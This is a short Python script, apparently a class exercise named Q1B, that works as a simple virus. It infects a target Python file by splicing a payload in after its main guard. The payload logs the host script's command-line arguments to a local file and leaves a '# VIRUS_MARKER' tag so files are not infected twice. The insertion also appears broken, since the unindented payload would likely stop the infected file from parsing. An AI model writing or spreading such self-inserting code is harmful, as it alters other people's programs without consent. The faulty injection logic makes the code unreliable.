import sys
import os

def is_script(file_path):
    with open(file_path, 'r') as f:
        content = f.read()
        return 'if __name__ == "__main__":' in content

def is_infected(file_path):
    with open(file_path, 'r') as f:
        content = f.read()
        return '# VIRUS_MARKER' in content

def infect_file(file_path):
    payload = """
import sys
import os
with open('Q1B.out', 'a') as f:
    f.write(f"{' '.join(sys.argv)}\\n")
# VIRUS_MARKER
"""
    with open(file_path, 'r') as f:
        original = f.read()
    with open(file_path, 'w') as f:
        f.write(original.replace('if __name__ == "__main__":', f'if __name__ == "__main__":\n{payload}'))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: Q1B.py <target.py>")
        sys.exit(1)
    target = sys.argv[1]
    if os.path.exists(target) and is_script(target) and not is_infected(target):
        infect_file(target)
